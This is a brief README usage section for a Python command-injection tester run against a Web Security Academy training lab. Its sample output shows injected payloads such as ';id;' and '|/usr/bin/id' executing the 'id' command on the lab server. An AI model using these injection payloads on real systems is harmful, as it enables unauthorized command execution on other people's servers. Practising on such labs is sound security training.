### USAGE :
```bash
python3 script.py https://ac141fd61efc6bd8c0e80e65002500f0.web-security-academy.net/
```
Output will be something like:
```bash
Response : sh: 1: Syntax error: end of file unexpected || Testing Payload : /index.html|id|
Response : 62
uid=12001(peter-MJTGDs) gid=12001(peter) groups=12001(peter) || Testing Payload : ;id;
Response : 62
uid=12001(peter-MJTGDs) gid=12001(peter) groups=12001(peter) || Testing Payload : ;id
Response : 62
uid=12001(peter-MJTGDs) gid=12001(peter) groups=12001(peter) || Testing Payload : ;id;
Response : uid=12001(peter-MJTGDs) gid=12001(peter) groups=12001(peter) || Testing Payload : |id
Response : uid=12001(peter-MJTGDs) gid=12001(peter) groups=12001(peter) || Testing Payload : |/usr/bin/id
.
.
.
.
.
```
